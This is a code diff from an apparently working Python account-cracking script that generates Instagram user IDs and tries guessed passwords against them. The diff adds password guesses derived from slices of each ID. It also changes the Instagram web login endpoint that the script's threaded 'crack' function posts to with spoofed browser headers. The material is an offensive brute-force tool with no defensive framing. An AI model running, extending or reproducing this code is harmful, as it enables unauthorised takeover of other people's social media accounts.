@@ -99,7 +99,7 @@ def random_number():
         linex()
         for xyz in idz:
             uid = code+xyz
-            pww = ['57273200'] 
+            pww = ['57273200',uid[:6],uid[:8],uid] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
             XYZ.submit(crack, uid, pww, total_idz)
     linex()
@@ -164,7 +164,7 @@ def crack(uid, pww, total_idz):
                 'x-ig-www-claim': '0',
                 'x-instagram-ajax': '1015781171',
                 'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://i.instagram.com/api/v1/web/accounts/login/ajax/'
+            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/?hl=en'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             session_cookies = response.cookies.get_dict()
             if response.status_code == 200:
